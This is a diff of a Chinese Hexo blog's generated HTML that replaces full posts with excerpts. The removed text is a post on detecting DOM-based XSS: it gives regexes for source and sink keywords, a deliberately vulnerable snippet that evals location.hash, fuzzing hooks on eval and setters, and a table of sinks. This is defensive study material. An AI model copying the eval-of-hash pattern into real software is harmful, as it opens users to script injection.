-<li>静态方法<br>　　静态方法查找危险关键字，可以使用下列正则表达式来匹配。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Finding Sources</span><br><span class="line"></span><br><span class="line">The following regular expression attempts to match most common DOMXSS sources (BETA):</span><br><span class="line"></span><br><span class="line">/(location\s*[\[.])|([.\[]\s*[&quot;&apos;]?\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\W)|(localStorage|sessionStorage|Database)/</span><br><span class="line"></span><br><span class="line">Finding Sinks</span><br><span class="line"></span><br><span class="line">The following regular expression attempts to match most common DOMXSS sinks (BETA):</span><br><span class="line"></span><br><span class="line">/((src|href|data|location|code|value|action)\s*[&quot;&apos;\]]*\s*\+?\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\s*[&quot;&apos;\]]*\s*\()/</span><br><span class="line"></span><br><span class="line">This regular expression finds sinks based on jQuery, it also finds the $ function, which is not always insecure:</span><br><span class="line"></span><br><span class="line">/after\(|\.append\(|\.before\(|\.html\(|\.prepend\(|\.replaceWith\(|\.wrap\(|\.wrapAll\(|\$\(|\.globalEval\(|\.add\(|jQUery\(|\$\(|\.parseHTML\(/</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>详情可以看<a href="https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki" target="_blank" rel="external">https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki</a><br>一旦发现页面存在可疑特征，就进行人工分析，这是静态方法的代价，对人工参与要求很高</p>
-<ol>
-<li>动态方法<br>　动态方法相当于一次Javascript源码动态审计的过程。书中提到了两种思路<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">eval(location.hash.substr(1));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>　就拿上面的例子来说，如何检测上面的DOM XSS<br>　1. 思路一<br>　　借用浏览器自身的动态性，可以写Firefox插件，批量对目标地址发起请求（一个模糊测试的过程），请求的形式为：在目标地址后加上#fuzzing内容，就当前这个例子来说。比如当前fuzzing内容为：<code>var x=&#39;d0mx55&#39;</code><br>　　并且对常见的输出点函数进行劫持，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var _eval=eval;</span><br><span class="line">eval=function(x)&#123;</span><br><span class="line">	if(typeof(x)==&apos;undefined&apos;)&#123;return;&#125;</span><br><span class="line">	if(x.indexOf(&apos;d0mx55&apos;)!=-1)&#123;alert(&apos;found dom xss&apos;);</span><br><span class="line">	_eval(x);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
-<p>　　在javascript层面劫持innerHTML这样的属性已经没那么容易了，常用的属性劫持可以针对具体的对象设置<code>__defineSetter__</code>，比如下面的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.__defineSetter__(&apos;x&apos;,function()&#123;alert(&apos;hijack x&apos;)&#125;);</span><br><span class="line">window.x=&apos;xxxxxYYYYYYYY&apos;;</span><br></pre></td></tr></table></figure></p>
-<p>当x赋值的时候，就会触发事先定义好的Setter方法。innerHTML属性属于那些节点对象，想劫持具体节点对象的innerHTML，需要事先知道这个具体节点的对象，然后设置<code>__defineSetter__</code>,这样如果要检测DOM XSS，就要劫持所有的输出点，比较麻烦，那么思路二可能会比较简单一点<br>　2. 思路二<br>　　仍然借用浏览器动态执行的优势，写一个Firefox插件，我们完全以黑盒的方式进行模糊测试输入点，然后判断渲染后的DOM树中是否有我们期待的值，比如，模糊测试的内容都有如下一段代码<code>document.write(&#39;d0m&#39;+&#39;x55&#39;)</code>如果这段代码顺利执行了就会存在d0mx55文本节点，后续的检测工作只要判断是否存在这个文本节点就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(document.documentElement.innerHTML.indexOf(&apos;d0mx55&apos;)!=-1)&#123;</span><br><span class="line">	alert(&apos;found dom xss&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>这个思路以DOM树的改变为判断依据，简单准确，但是同样无法避免那些逻辑判断上导致的漏报。</p>
-<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><table>
-<thead>
-<tr>
-<th>输出点</th>
-<th>javascript code</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>直接输出HTML内容</td>
-<td>document.write(…)<br>document.writeln(…)<br> document.body.innerHtml=…</td>
-</tr>
-<tr>
-<td>直接修改DOM树（包括DHTML事件）</td>
-<td>document.forms[0].action=…<br>document.attachEvent(…)<br>document.create…(…)<br>document.execCommand(…)<br>document.body. …<br>widow.attachEvent(…)</td>
-</tr>
-<tr>
-<td>替换document url</td>
-<td>document.location=…(以及直接赋值给location的href,host,hostname属性)<br>document.location.hostname=…<br>document.location.replace(…)<br>document.location.assign(…)<br>documnent.URL=…<br>window.navigate(…)</td>
-</tr>
-<tr>
-<td>打开或修改新窗口</td>
-<td>document.open(…)<br>window.open(…)<br>window.location.href=…(以及直接赋值给location的href,host,hostname属性)</td>
-</tr>
-<tr>
-<td>直接执行脚本</td>
-<td>eval(…)<br>window.execScript(…)<br>window.setInterval(…)<br>window.setTimeout(…)</td>
-</tr>
-</tbody>
-</table>
-
+              <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>　　这几天阅读了<em>《Web前端黑客技术揭秘》</em>，对DOM型的XSS进行一个总结，内容主要为书中提到的知识点，整理整理作以后复习所用。<br>　　DOM类型的XSS与反射型、存储型XSS都不同，DOM型XSS不用服务器端解析响应的参与，触发DOM型XSS可以说主要依靠浏览器客户端的解析。常见的输出点见<strong>0x04附录</strong>。<br>
+          
       
     </div>
     
@@ -739,6 +537,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webVul/">webVul</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a  href="/2016/03/17/DOM-XSS/#more">more&gt;&gt; >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -783,14 +585,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>　　python virtualenv为flask等web框架提供虚拟python环境（其他应用也可以），这样可以防止开发过程中安装的依赖影响原主机上的python环境，而且在迁移到上线环境中时，省去了配置上线环境中的python运行环境。</p>
-<h2 id="安装virtualenv"><a href="#安装virtualenv" class="headerlink" title="安装virtualenv"></a>安装virtualenv</h2><p>　　这里我推荐使用pip或者easy_install安装，同样也可以通过下载<a href="https://pypi.python.org/pypi/virtualenv" target="_blank" rel="external">virtualenv.py</a>来构建虚拟环境。<br>　　使用pip命令 <code>pip install virtualenv</code></p>
-<h2 id="建立环境"><a href="#建立环境" class="headerlink" title="建立环境"></a>建立环境</h2><p>　　首先进入网站的根目录（或者是任何需要建立虚拟环境的文件夹下）<br>　　使用dos命令 <code>virtualenv venv</code> 其中venv为python的虚拟环境，其中包括了python.exe、pip、easy_install等python环境。</p>
-<h2 id="激活环境"><a href="#激活环境" class="headerlink" title="激活环境"></a>激活环境</h2><p>　　完成上一步后，接下来需要在dos界面激活虚拟环境，这样可以使得接下来下载的python模块都位于venv下的pip环境中<br><code>Scripts\activate   激活虚拟环境</code><br><code>deactivate  退出虚拟环境</code><br>　　激活后命令行开头多了（venv），如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\code\python-workplace\flasker\venv&gt;Scripts\activate</span><br><span class="line">(venv) E:\code\python-workplace\flasker\venv&gt;</span><br></pre></td></tr></table></figure></p>
-<h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><p>　　在上面的基础下，通过<code>pip install xxxx</code>安装的模块都是安装在venv环境下的，对主机上的环境没有影响。</p>
-<h2 id="引入路径"><a href="#引入路径" class="headerlink" title="引入路径"></a>引入路径</h2><p>　　在具体使用过程中，需要把venv的路径导入sys.path，这样才可以使用虚拟环境中的python模块。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">importos,sys</span><br><span class="line">sys.path.append(os.getcwd()+<span class="string">'\\venv\\Lib\\site-packages'</span>)</span><br></pre></td></tr></table></figure></p>
-<p>　　到这里就完成了python虚拟环境的搭建，总体对经常变动编程环境的城旭猿来说这是个非常有用功能。<br>　　<strong>==The End==</strong></p>
-
+              <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>　　python virtualenv为flask等web框架提供虚拟python环境（其他应用也可以），这样可以防止开发过程中安装的依赖影响原主机上的python环境，而且在迁移到上线环境中时，省去了配置上线环境中的python运行环境。<br>
+          
       
     </div>
     
@@ -807,6 +603,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/flask/">flask</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a  href="/2016/03/16/flask-virtualenv/#more">more&gt;&gt; >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -840,7 +640,7 @@
             <div class="visit">
                 
                     <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" >海贼到访数: 
+                        <span id="site-visit" >今日到访数: 
                             <span id="busuanzi_value_site_uv"></span>
                         </span>
                     </span>
